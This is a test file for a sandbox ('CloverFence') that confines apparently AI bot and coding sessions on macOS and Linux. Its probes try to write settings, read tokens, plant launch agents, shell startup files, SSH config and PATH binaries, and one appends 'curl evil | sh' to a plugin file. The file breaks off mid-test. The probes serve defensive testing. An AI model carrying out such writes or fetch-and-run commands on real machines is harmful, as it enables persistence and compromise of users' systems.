import { describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Caller } from "@waifucave/clover-protocol";
import { fenceContextFor, policyAllows } from "../../src/contracts/fence";
import { CloverFence } from "../../src/fence/fence";
import { fencedSpawner, ownRepoHooks } from "../../src/fence/fenced-process";
import { bwrapArgs, bwrapPlan, heldFolderNote, unixSocketFilter } from "../../src/fence/linux-bwrap";
import { macFenceProfile } from "../../src/fence/macos-profile";
import { callerPlaces } from "../../src/fence/per-caller";
import type { FencedRun, FencedRunResult } from "../../src/fence/spawn";

const mac = process.platform === "darwin" && existsSync("/usr/bin/sandbox-exec");
const linuxBwrap = process.platform === "linux" && existsSync("/usr/bin/bwrap")
  && Bun.spawnSync(["/usr/bin/bwrap", "--ro-bind", "/", "/", "--dev", "/dev", "--proc", "/proc", "--unshare-net", "--unshare-pid", "/bin/true"]).exitCode === 0;
const here = process.platform === "darwin" ? "macos" : "linux";

const botCaller = (bot: string, sessionId: string): Caller => ({ kind: "session", sessionId, sessionKind: "bot", bot });

function world() {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-")));
  const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), outside = join(root, "outside");
  for (const d of [join(clover, "settings"), join(clover, "run"), join(clover, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
  writeFileSync(join(clover, "settings.json"), "orig");
  writeFileSync(join(clover, "run", "token"), "secret-ish");
  const fence = new CloverFence({ os: here, home, cloverHome: clover, temp });
  const spawner = fencedSpawner({ fence });
  const run = (command: string, who: FencedRun["who"] = { caller: { kind: "session", sessionId: "c1", sessionKind: "coding" } }) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who });
  return { root, home, clover, temp, outside, fence, spawner, run };
}

function worldBot() {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-fp-")));
  const home = join(root, "home"), clover = join(home, ".clover"), temp = join(root, "tmp"), outside = join(root, "outside");
  for (const d of [join(clover, "settings"), join(clover, "run"), join(clover, "plugins-state", "oks"), join(home, "project"), temp, outside]) mkdirSync(d, { recursive: true });
  writeFileSync(join(clover, "settings.json"), "orig");
  writeFileSync(join(clover, "run", "token"), "secret-ish");
  const fence = new CloverFence({ os: here, home, cloverHome: clover, temp });
  const spawner = fencedSpawner({ fence });
  // A bot's own session (main conversation or side thread)
  const run = (command: string, who: FencedRun["who"] = { caller: botCaller("luna", "s1") }) => spawner.run({ command, cwd: join(home, "project"), env: { PATH: "/usr/bin:/bin", HOME: home }, timeoutMs: 15_000, who });
  return { root, home, clover, temp, outside, fence, spawner, run };
}

const ok = (r: FencedRunResult) => r.kind === "exited" && r.code === 0;

describe("the macOS profile, as text", () => {
  test("Clover home default-deny first; holder folders; outside naming; specific fenced denies", () => {
    // Policy matching the real fence: Clover home in denyWrite/denyRead for default-deny,
    // plus specific fenced items, one of them outside the home.
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
      allowWrite: ["/U/me", "/tmp/x"],
      denyWrite: ["/U/me/.clover/settings.json", "/U/me/.clover/plugins-state/oks", "/U/me/.clover", "/U/me/Library/LaunchAgents/com.waifucave.clover.core.plist"],
      denyRead: ["/U/me/.clover/run", "/U/me/.clover"],
      closedDoors: ["open", "launchctl", "osascript"], blockedAddresses: [], network: "none" } });
    const at = (s: string) => p.indexOf(s);
    // Strings stored in variables to avoid TypeScript parser issues with parentheses in string literals.
    const denyCloverHome = '(deny file-write* (subpath "/U/me/.clover")';
    const allowWriteSubpath = '(allow file-write* (subpath';
    const denyHomeLiteral = '(deny file-write* (literal "/U/me")';
    const denySettingsJson = '(subpath "/U/me/.clover/settings.json")';
    const denyPluginsStateOks = '(subpath "/U/me/.clover/plugins-state/oks")';
    const denyLaunchAgentsPlist = '(subpath "/U/me/Library/LaunchAgents/com.waifucave.clover.core.plist")';
    const denyRunSubpath = '(deny file-read* (subpath "/U/me/.clover/run")';
    // 1. Clover home default-deny (subpath) comes after allowWrite
    expect(at(denyCloverHome)).toBeGreaterThan(at(allowWriteSubpath));
    // 2. Holder folder denies (literal) come after Clover home deny
    expect(at(denyHomeLiteral)).toBeGreaterThan(at(denyCloverHome)); // renaming home moves Clover home
    expect(p).not.toContain('(literal "/U")'); // above writable roots nothing writable
    // 3. No naming handling for folders inside the Clover home: the home deny refuses every new name there.
    expect(p).not.toContain("clover/plugins-state/[ -.0-~]");
    expect(p).not.toContain("clover/sdk/[ -.0-~]");
    // Naming handling only outside the home (the login places): deny non-ASCII names, then allow ASCII ones.
    const nameLaunchAgentsDeny = '(deny file-write* (regex #"^/U/me/Library/LaunchAgents/[^/]"))';
    const nameLaunchAgentsAllow = '(allow file-write* (regex #"^/U/me/Library/LaunchAgents/[ -.0-~]+(/|$)"))';
    expect(p).toContain(nameLaunchAgentsDeny);
    expect(at(nameLaunchAgentsAllow)).toBeGreaterThan(at(denyHomeLiteral));
    // 4. Specific fenced item denies come AFTER naming folder allows so they can't be overridden by them.
    expect(at(denySettingsJson)).toBeGreaterThan(at(nameLaunchAgentsAllow));
    expect(at(denyPluginsStateOks)).toBeGreaterThan(at(nameLaunchAgentsAllow));
    expect(at(denyLaunchAgentsPlist)).toBeGreaterThan(at(nameLaunchAgentsAllow));
    expect(p).toContain(denyRunSubpath);
    expect(p).toContain('(deny process-exec (literal "/usr/bin/open") (literal "/bin/launchctl") (literal "/usr/bin/osascript"))');
    expect(p.trim().endsWith("(deny network*)")).toBe(true);
  });

  test("naming allows come before the home deny in effect, and never reach inside it", () => {
    // A fenced item directly under /U would make /U a naming folder that contains the home: skipped.
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover", "/U/x"], denyRead: ["/U/me/.clover"],
      closedDoors: [], blockedAddresses: [], network: "none" } });
    expect(p).not.toContain('(regex #"^/U/[^/]")');
    expect(p).not.toContain('(regex #"^/U/[ -.0-~]');
  });

  test("the caller's rules: its own folders read and write after the denies; the home stays denied otherwise", () => {
    const caller = callerPlaces("/U/me/.clover", "macos", { sessionId: "s1", memoryOf: "luna" });
    const p = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, caller, policy: {
      allowWrite: ["/U/me"], denyWrite: ["/U/me/.clover"], denyRead: ["/U/me/.clover"],
      closedDoors: [], blockedAddresses: [], network: "none" } });
    const at = (s: string) => p.indexOf(s);
    const homeDeny = '(deny file-write* (subpath "/U/me/.clover")';
    const allowOwnBot = '(allow file-read* (regex #"^/U/me/\\.clover/bots/luna(/|$)"))';
    const allowMemoryRw = '(allow file-read* file-write* (regex #"^/U/me/\\.clover/bots/luna/memory/"))';
    const denyMemoryWrite = '(deny file-write* (literal "/U/me/.clover/bots/luna/memory"))';
    // The owner's bot folder reads, its memory reads and writes (but never over itself), after the home deny.
    expect(at(allowOwnBot)).toBeGreaterThan(at(homeDeny));
    expect(at(allowMemoryRw)).toBeGreaterThan(at(homeDeny));
    expect(at(denyMemoryWrite)).toBeGreaterThan(at(allowMemoryRw));
    // Its session's outputs, its scratch and its routines read and write too.
    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/outputs/s1/"))');
    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/scratch/luna/"))');
    expect(p).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/routines/luna/"))');
    // No plugin-data allow: this runner is no plugin.
    expect(p).not.toContain("plugin-data");
    // A runner that is a coding session gets its outputs, and no bot folder, memory, scratch or routines.
    const someoneElse = macFenceProfile({ cloverHome: "/U/me/.clover", home: "/U/me", perUserTemp: null, policy: {
      allowWrite: ["/U/me"], denyWrite: [], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" },
      caller: callerPlaces("/U/me/.clover", "macos", { sessionId: "c1" }) });
    expect(someoneElse).toContain('(allow file-read* file-write* (regex #"^/U/me/\\.clover/outputs/c1/"))');
    expect(someoneElse).not.toContain("/U/me/\\.clover/bots/");
    expect(someoneElse).not.toContain("/U/me/\\.clover/scratch/");
    expect(someoneElse).not.toContain("/U/me/\\.clover/routines/");
  });
});

describe.skipIf(!mac)("the profile agrees with policyAllows, on the real sandbox", () => {
  test("read, write, create and delete, for each caller kind", async () => {
    const callers: Caller[] = [
      { kind: "session", sessionId: "s1", sessionKind: "bot", bot: "luna" },
      { kind: "session", sessionId: "t1", sessionKind: "side-thread", bot: "luna" },
      { kind: "session", sessionId: "a1", sessionKind: "agent", bot: "luna" },
      { kind: "session", sessionId: "c1", sessionKind: "coding" },
      { kind: "session", sessionId: "s9", sessionKind: "bot", bot: "alpha" },
      { kind: "plugin", pluginId: "tarot" },
    ];
    for (const caller of callers) {
      const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-equiv-")));
      try {
        const home = join(root, "home"), clover = join(home, ".clover");
        const sid = caller.kind === "session" ? caller.sessionId : "nobody";
        const bseg = caller.kind === "session" && (caller.sessionKind === "bot" || caller.sessionKind === "side-thread") ? caller.bot!.replace("/", "--") : null;
        const ownScratch = bseg === null ? join(clover, "scratch", "luna") : join(clover, "scratch", bseg);
        const ownRoutines = bseg === null ? join(clover, "routines", "luna") : join(clover, "routines", bseg);
        const ownOutputs = join(clover, "outputs", sid);
        const ownPluginData = caller.kind === "plugin" ? join(clover, "plugin-data", String(caller.pluginId).replace("/", "--")) : join(clover, "plugin-data", "tarot");
        const dirs = [join(clover, "run"), join(clover, "plugins-state", "oks"), join(clover, "sessions-runtime"), join(clover, "projects", "k"),
          join(clover, "bots", "luna", "memory"), join(clover, "bots", "luna", "agents"), join(clover, "bots", "sol", "memory"),
          join(clover, "bots", "alpha", "memory"), join(home, "project"), join(clover, "sdk"),
          join(clover, "scratch", "luna"), join(clover, "scratch", "alpha"),
          join(clover, "routines", "luna"), join(clover, "routines", "alpha"),
          join(clover, "plugin-data", "tarot"), join(clover, "plugin-data", "luna"), ownOutputs,
          join(home, "Library", "LaunchAgents"),
          join(home, ".ssh"), join(home, "bin"), join(home, ".local", "bin"),
          join(home, ".config", "git"), join(home, ".config", "fish", "conf.d"),
          join(home, ".config", "environment.d"), join(home, ".config", "plasma-workspace", "env"),
          join(home, ".vim"), join(home, ".config", "nvim"), join(home, ".gnupg"),
          join(home, ".config", "pip"), join(home, ".bun", "bin"), join(home, ".cargo", "bin"),
          join(home, ".oh-my-zsh", "custom"), join(home, "Library", "Preferences"), join(home, "Library", "Scripts"),
          join(home, "project", ".git", "hooks")];
        for (const d of dirs) mkdirSync(d, { recursive: true });
        const files: Record<string, string> = {
          [join(clover, "settings.json")]: "s", [join(clover, "run", "tok")]: "t",
          [join(clover, "bots", "luna", "memory", "MEMORY.md")]: "l", [join(clover, "bots", "luna", "agents", "t.json")]: "{}",
          [join(clover, "bots", "sol", "memory", "MEMORY.md")]: "s", [join(clover, "sessions-runtime", "rt.json")]: "{}",
          [join(clover, "projects", "k", "s.jsonl")]: "{}", [join(home, "project", "a.txt")]: "a",
          [join(home, "project", "del.txt")]: "d", [join(ownOutputs, "r.md")]: "r", [join(ownOutputs, "del.md")]: "d",
        };
        for (const [p, c] of Object.entries(files)) writeFileSync(p, c);
        const fence = new CloverFence({ os: "macos", home, cloverHome: clover, temp: join(root, "tmp") });
        const ctx = fenceContextFor(caller);
        const policy = fence.policy(ctx);
        const profile = macFenceProfile({ policy, cloverHome: clover, home, perUserTemp: null, caller: callerPlaces(clover, "macos", ctx) });
        type Probe = { shell: string; op: "read" | "write" | "unlink"; path: string };
        const P: Probe[] = [
          { shell: `cat '${join(clover, "settings.json")}'`, op: "read", path: join(clover, "settings.json") },
          { shell: `echo x >> '${join(clover, "settings.json")}'`, op: "write", path: join(clover, "settings.json") },
          { shell: `cat '${join(clover, "run", "tok")}'`, op: "read", path: join(clover, "run", "tok") },
          { shell: `cat '${join(clover, "bots", "luna", "agents", "t.json")}'`, op: "read", path: join(clover, "bots", "luna", "agents", "t.json") },
          { shell: `echo x >> '${join(clover, "bots", "luna", "agents", "t.json")}'`, op: "write", path: join(clover, "bots", "luna", "agents", "t.json") },
          { shell: `echo x > '${join(clover, "bots", "luna", "agents", "new.json")}'`, op: "write", path: join(clover, "bots", "luna", "agents", "new.json") },
          { shell: `cat '${join(clover, "bots", "luna", "memory", "MEMORY.md")}'`, op: "read", path: join(clover, "bots", "luna", "memory", "MEMORY.md") },
          { shell: `echo x >> '${join(clover, "bots", "luna", "memory", "MEMORY.md")}'`, op: "write", path: join(clover, "bots", "luna", "memory", "MEMORY.md") },
          { shell: `echo x > '${join(clover, "bots", "luna", "memory", "new.md")}'`, op: "write", path: join(clover, "bots", "luna", "memory", "new.md") },
          { shell: `rm '${join(clover, "bots", "luna", "memory", "MEMORY.md")}'`, op: "unlink", path: join(clover, "bots", "luna", "memory", "MEMORY.md") },
          { shell: `cat '${join(clover, "bots", "sol", "memory", "MEMORY.md")}'`, op: "read", path: join(clover, "bots", "sol", "memory", "MEMORY.md") },
          { shell: `ls '${join(clover, "bots")}'`, op: "read", path: join(clover, "bots") },
          { shell: `cat '${join(clover, "projects", "k", "s.jsonl")}'`, op: "read", path: join(clover, "projects", "k", "s.jsonl") },
          { shell: `cat '${join(clover, "sessions-runtime", "rt.json")}'`, op: "read", path: join(clover, "sessions-runtime", "rt.json") },
          { shell: `echo x > '${join(clover, "plugins-state", "evil")}'`, op: "write", path: join(clover, "plugins-state", "evil") },
          { shell: `echo x > '${join(clover, "sdk", "evil")}'`, op: "write", path: join(clover, "sdk", "evil") },
          { shell: `cat '${join(home, "project", "a.txt")}'`, op: "read", path: join(home, "project", "a.txt") },
          { shell: `echo x >> '${join(home, "project", "a.txt")}'`, op: "write", path: join(home, "project", "a.txt") },
          { shell: `echo x > '${join(home, "project", "new.txt")}'`, op: "write", path: join(home, "project", "new.txt") },
          { shell: `rm '${join(home, "project", "del.txt")}'`, op: "unlink", path: join(home, "project", "del.txt") },
          { shell: `cat '${join(ownOutputs, "r.md")}'`, op: "read", path: join(ownOutputs, "r.md") },
          { shell: `echo x >> '${join(ownOutputs, "r.md")}'`, op: "write", path: join(ownOutputs, "r.md") },
          { shell: `echo x > '${join(ownOutputs, "new.md")}'`, op: "write", path: join(ownOutputs, "new.md") },
          { shell: `rm '${join(ownOutputs, "del.md")}'`, op: "unlink", path: join(ownOutputs, "del.md") },
          { shell: `rmdir '${ownOutputs}'`, op: "unlink", path: ownOutputs },
          { shell: `ls '${ownOutputs}'`, op: "read", path: ownOutputs },
          { shell: `echo x > '${join(ownScratch, "new.md")}'`, op: "write", path: join(ownScratch, "new.md") },
          { shell: `echo x > '${join(ownRoutines, "new.md")}'`, op: "write", path: join(ownRoutines, "new.md") },
          { shell: `echo x > '${join(ownPluginData, "new.json")}'`, op: "write", path: join(ownPluginData, "new.json") },
          { shell: `echo x > '${join(clover, "plugin-data", "luna", "new.json")}'`, op: "write", path: join(clover, "plugin-data", "luna", "new.json") },
          { shell: `echo x > '${join(home, ".zshrc")}'`, op: "write", path: join(home, ".zshrc") },
          { shell: `echo x > '${join(home, ".bash_logout")}'`, op: "write", path: join(home, ".bash_logout") },
          { shell: `echo x > '${join(home, ".zlogout")}'`, op: "write", path: join(home, ".zlogout") },
          { shell: `echo x > '${join(home, ".gitconfig")}'`, op: "write", path: join(home, ".gitconfig") },
          { shell: `echo x > '${join(home, ".config", "git", "config")}'`, op: "write", path: join(home, ".config", "git", "config") },
          { shell: `echo x > '${join(home, ".ssh", "config")}'`, op: "write", path: join(home, ".ssh", "config") },
          { shell: `echo x > '${join(home, "bin", "evil")}'`, op: "write", path: join(home, "bin", "evil") },
          { shell: `echo x > '${join(home, ".local", "bin", "evil")}'`, op: "write", path: join(home, ".local", "bin", "evil") },
          { shell: `echo x > '${join(home, ".config", "fish", "conf.d", "evil.fish")}'`, op: "write", path: join(home, ".config", "fish", "conf.d", "evil.fish") },
          { shell: `echo x > '${join(home, ".config", "environment.d", "evil.conf")}'`, op: "write", path: join(home, ".config", "environment.d", "evil.conf") },
          { shell: `echo x > '${join(home, ".config", "plasma-workspace", "env", "evil.sh")}'`, op: "write", path: join(home, ".config", "plasma-workspace", "env", "evil.sh") },
          { shell: `echo x > '${join(home, "Library", "LaunchAgents", "evil.plist")}'`, op: "write", path: join(home, "Library", "LaunchAgents", "evil.plist") },
          { shell: `echo x > '${join(home, ".vimrc")}'`, op: "write", path: join(home, ".vimrc") },
          { shell: `echo x > '${join(home, ".vim", "evil.vim")}'`, op: "write", path: join(home, ".vim", "evil.vim") },
          { shell: `echo x > '${join(home, ".config", "nvim", "evil.lua")}'`, op: "write", path: join(home, ".config", "nvim", "evil.lua") },
          { shell: `echo x > '${join(home, ".emacs")}'`, op: "write", path: join(home, ".emacs") },
          { shell: `echo x > '${join(home, ".gnupg", "gpg.conf")}'`, op: "write", path: join(home, ".gnupg", "gpg.conf") },
          { shell: `echo x > '${join(home, ".config", "pip", "evil.conf")}'`, op: "write", path: join(home, ".config", "pip", "evil.conf") },
          { shell: `echo x > '${join(home, ".bunfig.toml")}'`, op: "write", path: join(home, ".bunfig.toml") },
          { shell: `echo x > '${join(home, ".bun", "bin", "evil")}'`, op: "write", path: join(home, ".bun", "bin", "evil") },
          { shell: `echo x > '${join(home, ".npmrc")}'`, op: "write", path: join(home, ".npmrc") },
          { shell: `echo x > '${join(home, ".cargo", "bin", "evil")}'`, op: "write", path: join(home, ".cargo", "bin", "evil") },
          { shell: `echo x > '${join(home, ".cargo", "config.toml")}'`, op: "write", path: join(home, ".cargo", "config.toml") },
          { shell: `echo x > '${join(home, ".bash_aliases")}'`, op: "write", path: join(home, ".bash_aliases") },
          { shell: `echo x > '${join(home, ".oh-my-zsh", "custom", "evil.zsh")}'`, op: "write", path: join(home, ".oh-my-zsh", "custom", "evil.zsh") },
          { shell: `echo x > '${join(home, "Library", "Preferences", "com.apple.loginwindow.plist")}'`, op: "write", path: join(home, "Library", "Preferences", "com.apple.loginwindow.plist") },
          { shell: `echo x > '${join(home, "Library", "Scripts", "evil.sh")}'`, op: "write", path: join(home, "Library", "Scripts", "evil.sh") },
          { shell: `echo x > '${join(home, "project", ".git", "config")}'`, op: "write", path: join(home, "project", ".git", "config") },
        ];
        const script = P.map((pr, i) => `{ ${pr.shell}; } >/dev/null 2>&1; echo "${i}:$?";`).join("\n");
        const proc = Bun.spawn(["/usr/bin/sandbox-exec", "-p", profile, "/bin/sh", "-c", script], { stdout: "pipe", stderr: "pipe" });
        const out = await new Response(proc.stdout).text();
        await proc.exited;
        const codes = new Map(out.trim().split("\n").map((l) => l.split(":") as [string, string]).map(([i, c]) => [Number(i), c === "0"]));
        expect(codes.size).toBe(P.length);
        for (const [i, pr] of P.entries()) {
          const expected = policyAllows(policy, pr.op, pr.path, "macos");
          expect([caller, pr.op, pr.path, codes.get(i)]).toEqual([caller, pr.op, pr.path, expected]);
        }
      } finally { rmSync(root, { recursive: true, force: true }); }
    }
  }, 120_000);
});

describe("the Linux sandbox's mounts, as arguments", () => {
  test("the Clover home is a tmpfs view holding nothing without a caller; outside items read-only", () => {
    const dirs = new Set(["/h", "/h/.clover", "/h/.clover/settings", "/h/.clover/run", "/h/dev", "/h/dev/luna", "/t", "/run/user/1000"]);
    const files = new Set(["/h/.clover/settings.json", "/h/.clover/notes.txt"]);
    const fs = {
      kind: (p: string) => (dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
      list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const a = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, policy: {
      allowWrite: ["/h", "/t"], denyWrite: ["/h/.clover", "/h/.clover/settings.json", "/h/.clover/settings", "/h/dev/luna"],
      denyRead: ["/h/.clover", "/h/.clover/run"], closedDoors: ["systemd-run"], blockedAddresses: [], network: "none" } });
    const s = a.join(" ");
    expect(s.startsWith("--die-with-parent --new-session --unshare-net --unshare-pid")).toBe(true);
    expect(s).toContain("--ro-bind / / --dev /dev --proc /proc --bind /h /h --bind /t /t");
    // The home is a tmpfs view: nothing of it is bound back without a caller.
    expect(s).toContain("--tmpfs /h/.clover");
    expect(s).toContain("--remount-ro /h/.clover");
    expect(s).not.toContain("--ro-bind /h/.clover ");
    expect(s).not.toContain("--bind /h/.clover/settings ");
    expect(s).not.toContain("--bind /h/.clover/notes.txt ");
    // The top folders exist so a runner can list its own (empty) view.
    for (const t of ["bots", "outputs", "scratch", "routines", "plugin-data"]) expect(s).toContain(`--dir /h/.clover/${t}`);
    // Outside the home: the development folder read-only where it is, its holder a mount point.
    expect(s).toContain("--bind /h/dev /h/dev"); // holds a development folder: a mount point, so it can't be renamed
    expect(s).toContain("--ro-bind /h/dev/luna /h/dev/luna");
    expect(s).toContain("--tmpfs /run/user/1000");
    expect(s.endsWith("--chdir /h/p")).toBe(true);
  });

  test("the caller's view: only its own folders bound into the home's tmpfs view", () => {
    const dirs = new Set(["/h", "/h/.clover", "/h/.clover/bots", "/h/.clover/bots/luna", "/h/.clover/bots/luna/memory",
      "/h/.clover/bots/luna/agents", "/h/.clover/bots/sol", "/h/.clover/bots/sol/memory",
      "/h/.clover/outputs", "/h/.clover/outputs/s1", "/h/.clover/outputs/c1", "/h/.clover/outputs/a1",
      "/h/.clover/scratch", "/h/.clover/scratch/luna",
      "/h/.clover/routines", "/h/.clover/routines/luna", "/h/.clover/sdk", "/h/.clover/sdk/projects",
      "/h/.clover/sdk/projects/key", "/h/p"]);
    const files = new Set(["/h/.clover/sdk/projects/key/s.jsonl", "/h/.clover/bots/luna/memory/MEMORY.md"]);
    const fs = {
      kind: (p: string) => (p === "/h/.clover/projects" ? "other" as const : dirs.has(p) ? "dir" as const : files.has(p) ? "file" as const : null),
      list: (d: string) => [...dirs, ...files].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const policy = { allowWrite: ["/h"], denyWrite: ["/h/.clover", "/h/.clover/sdk/projects", "/h/.clover/projects"],
      denyRead: ["/h/.clover", "/h/.clover/sdk/projects", "/h/.clover/projects"], closedDoors: [], blockedAddresses: [], network: "none" as const };
    const owner = callerPlaces("/h/.clover", "linux", { sessionId: "s1", memoryOf: "luna" });
    const s = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, caller: owner, policy }).join(" ");
    expect(s).toContain("--tmpfs /h/.clover");
    // Its own bot folder reads; its memory, outputs, scratch and routines read and write.
    expect(s).toContain("--ro-bind /h/.clover/bots/luna /h/.clover/bots/luna");
    expect(s).toContain("--bind /h/.clover/bots/luna/memory /h/.clover/bots/luna/memory");
    expect(s).toContain("--bind /h/.clover/outputs/s1 /h/.clover/outputs/s1");
    expect(s).toContain("--bind /h/.clover/scratch/luna /h/.clover/scratch/luna");
    expect(s).toContain("--bind /h/.clover/routines/luna /h/.clover/routines/luna");
    expect(s).not.toContain("bots/sol");
    // The transcript store stays hidden: nothing of it is bound back.
    expect(s).not.toContain("sdk/projects");
    expect(s).not.toContain("/h/.clover/projects");
    // A coding session or an agent: only its own outputs, no bot folder at all.
    for (const ctx of [{ sessionId: "c1" }, { sessionId: "a1" }]) {
      const other = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, caller: callerPlaces("/h/.clover", "linux", ctx), policy }).join(" ");
      expect(other).toContain("--tmpfs /h/.clover");
      expect(other).toContain(`--bind /h/.clover/outputs/${ctx.sessionId} /h/.clover/outputs/${ctx.sessionId}`);
      expect(other).not.toContain("bots/luna");
      expect(other).not.toContain("bots/sol");
    }
  });
});

describe("the session's own repo", () => {
  test("ownRepoHooks finds the repo holding the cwd, without following links; elsewhere null", () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), "clover-repo-")));
    const home = join(root, "home");
    mkdirSync(join(home, "project", "sub"), { recursive: true });
    mkdirSync(join(home, "project", ".git", "hooks"), { recursive: true });
    try {
      expect(ownRepoHooks(join(home, "project", "sub"), home)).toBe(join(home, "project", ".git", "hooks"));
      expect(ownRepoHooks(join(home, "project"), home)).toBe(join(home, "project", ".git", "hooks"));
      expect(ownRepoHooks(join(home, "elsewhere"), home)).toBeNull();
      expect(ownRepoHooks(join(root, "outside"), home)).toBeNull();
      symlinkSync(join(home, "project"), join(home, "linked"));
      expect(ownRepoHooks(join(home, "linked", "sub"), home)).toBeNull(); // the link itself isn't climbed through
    } finally { rmSync(root, { recursive: true, force: true }); }
  });

  test("the Linux sandbox's mounts bind the session repo's hooks read-only", () => {
    const dirs = new Set(["/h", "/h/p", "/h/p/.git", "/h/p/.git/hooks"]);
    const fs = {
      kind: (p: string) => (dirs.has(p) ? "dir" as const : null),
      list: (d: string) => [...dirs].filter((p) => p !== d && p.startsWith(`${d}/`) && !p.slice(d.length + 1).includes("/")).map((p) => p.slice(d.length + 1)),
    };
    const s = bwrapArgs({ cloverHome: "/h/.clover", cwd: "/h/p", uid: 1000, fs, repoHooks: "/h/p/.git/hooks", policy: {
      allowWrite: ["/h"], denyWrite: ["/h/.clover"], denyRead: ["/h/.clover"], closedDoors: [], blockedAddresses: [], network: "none" } }).join(" ");
    expect(s).toContain("--ro-bind /h/p/.git/hooks /h/p/.git/hooks");
  });
});

describe("a folder held for a fenced file that isn't there yet (accepted for now, the controller's ruling)", () => {
  test("the plan names it, and a read-only refusal there is explained: which file, a subfolder, or ask the user", () => {
    const dirs = new Set(["/h", "/h/.clover", "/t"]);
    const fs = { kind: (p: string) => (dirs.has(p) ? "dir" as const : p === "/h/.bashrc" ? "file" as const : null), list: () => [] as string[] };
    const { held } = bwrapPlan({ cloverHome: "/h/.clover", cwd: "/h", uid: 1, fs, policy: {
      allowWrite: ["/h", "/t"], denyWrite: ["/h/.bashrc", "/h/.zshrc", "/h/.clover/settings.json"], denyRead: [], closedDoors: [], blockedAddresses: [], network: "none" } });
    expect(held).toEqual([{ folder: "/h", because: "/h/.zshrc" }]);
    const note = heldFolderNote("sh: 1: cannot create /h/new.txt: Read-only file system\n", held)!;
    expect(note).toContain("/h takes no new names under the fence, because /h/.zshrc is fenced");
    expect(note).toMatch(/subfolder.*ask the user/);
    expect(heldFolderNote("permission denied", held)).toBeNull();
  });
});

describe("the Linux seccomp filter", () => {
  test("nine instructions: the architecture, io_uring_setup, socket(AF_UNIX) refused; anything else allowed", () => {
    const f = unixSocketFilter("x64")!;
    expect(f.length).toBe(9 * 8);
    expect(f.readUInt32LE(1 * 8 + 4)).toBe(0xc000003e);
    expect(f.readUInt32LE(4 * 8 + 4)).toBe(41);
    expect(unixSocketFilter("arm64")!.readUInt32LE(4 * 8 + 4)).toBe(198);
    expect(f.readUInt32LE(8 * 8 + 4)).toBe(0x00050001); // EPERM
    expect(unixSocketFilter("ia32")).toBeNull();
  });
});

describe.skipIf(!mac && !linuxBwrap)(`${here}: a command under the fence, on the real sandbox`, () => {
  test("the fenced items, however they're named, can't be written; the home and temp can; nothing else in the Clover home", async () => {
    const w = world();
    for (const target of ["settings.json", "SETTINGS.json", "ſettings.json", "settings/new.json", "plugins-state/oks/x.json", "PLUGINS-STATE/OKS/y.json"]) {
      expect(ok(await w.run(`echo x > '${join(w.clover, target)}'`))).toBe(false);
    }
    expect(readFileSync(join(w.clover, "settings.json"), "utf8")).toBe("orig");
    // Home and temp are writable.
    expect(ok(await w.run(`echo x > '${join(w.home, "project", "a.txt")}' && echo y > '${join(w.temp, "b.txt")}'`))).toBe(true);
    // Nothing else in the Clover home is reachable (default-deny).
    expect(ok(await w.run(`echo x > '${join(w.clover, "scratch", "c.txt")}'`))).toBe(false);
    // The plugins folder and the login-start place, ahead of and in the contract: a launch agent.
    mkdirSync(join(w.clover, "plugins", "tarot"), { recursive: true });
    for (const target of [join(w.clover, "plugins", "tarot", "clover.json")]) {
      expect(ok(await w.run(`echo 'curl evil | sh' >> '${target}'`))).toBe(false);
    }
    if (here === "macos") {
      // Clover's own login item, a new launch agent, and the shell startup files: a bot's session plants none.
      expect(ok(await w.run(`echo x >> '${join(w.home, "Library", "LaunchAgents", "com.waifucave.clover.core.plist")}'`))).toBe(false);
      mkdirSync(join(w.home, "Library", "LaunchAgents"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, "Library", "LaunchAgents", "evil.plist")}'`))).toBe(false);
      expect(existsSync(join(w.home, "Library", "LaunchAgents", "evil.plist"))).toBe(false);
      for (const f of [".zshrc", ".zprofile", ".zshenv", ".zlogin", ".bashrc", ".bash_profile", ".profile", ".bash_login", ".bash_logout", ".zlogout", ".logout", ".gitconfig"]) {
        expect(ok(await w.run(`echo x > '${join(w.home, f)}'`))).toBe(false);
      }
      expect(existsSync(join(w.home, ".zshrc"))).toBe(false);
      // SSH and git config, PATH-ahead folders, fish and the login items storage: none of it is planted.
      mkdirSync(join(w.home, ".ssh"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".ssh", "config")}'`))).toBe(false);
      mkdirSync(join(w.home, ".config", "git"), { recursive: true });
      expect(ok(await w.run(`echo x > '${join(w.home, ".config", "git", "config")}'`))).toBe(false);
      for (const d of [join(w.home, "bin"), join(w.home, ".local", "bin")] ) {
        mkdirSync(d, { recursive: true });
        expect(ok(await w.run(`echo x > '${join(d, "evil")}'`))).toBe(false);
        expect(existsSync(join(d, "evil"))).toBe(false);
      }
